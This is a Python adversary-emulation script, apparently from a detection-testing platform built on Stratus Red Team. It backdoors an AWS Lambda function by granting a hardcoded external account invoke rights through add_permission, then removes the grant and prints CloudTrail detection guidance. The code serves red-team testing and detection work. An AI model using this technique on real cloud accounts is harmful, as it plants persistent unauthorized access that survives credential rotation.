"""
Technique : aws.persistence.lambda-backdoor-function
Tactic    : Persistence (T1098)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.lambda-backdoor-function/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target Lambda function.

How the attack works:
  An attacker with lambda:AddPermission can add a resource-based policy to an
  existing Lambda function, granting an external AWS account the ability to
  invoke it.  This creates a persistent execution path that survives code
  deployments and IAM credential rotation.

Detection signal:
  - lambda:AddPermission granting cross-account or wildcard InvokeFunction.
  - Unexpected StatementIds in the function's resource policy.

Revert:
  - Automated: lambda:RemovePermission in the finally block.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

ATTACKER_ACCOUNT_ID = "193672423079"
STATEMENT_ID        = "stratus-red-team-backdoor-stmt"
DWELL_TIME_S        = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir     = str(Path(__file__).parent.parent / "infra")
    infra         = get_pulumi_outputs(stack_dir)
    function_name = infra.get("function_name", "stratus-red-team-backdoor-lambda")

    lambda_client  = session.client("lambda")

    permission_added = False

    try:
        # ── Step 1: Add cross-account invoke permission ───────────────────────
        banner("Step 1 — Backdoor Lambda resource policy (AddPermission)")
        lambda_client.add_permission(
            FunctionName=function_name,
            StatementId=STATEMENT_ID,
            Action="lambda:InvokeFunction",
            Principal=ATTACKER_ACCOUNT_ID,
        )
        permission_added = True
        print(f"  [+] Permission added to function: {function_name}")
        print(f"  [+] Principal (attacker account): {ATTACKER_ACCOUNT_ID}")
        print(f"  [+] Statement ID: {STATEMENT_ID}")
        print(f"  [!] CloudTrail event: lambda:AddPermission")
        print(f"  [!] Attacker can now invoke this function from account {ATTACKER_ACCOUNT_ID}.")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Remove backdoor permission (RemovePermission)")
        if permission_added:
            try:
                lambda_client.remove_permission(
                    FunctionName=function_name,
                    StatementId=STATEMENT_ID,
                )
                print(f"  [+] Permission removed: {STATEMENT_ID}")
            except ClientError as exc:
                print(f"  [!] RemovePermission failed: {exc}")

    banner("Complete")
    print("CloudTrail events: lambda:AddPermission, lambda:RemovePermission")
    print("\nDetection guidance:")
    print("  Alert on lambda:AddPermission with cross-account or '*' Principal.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the Lambda function.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
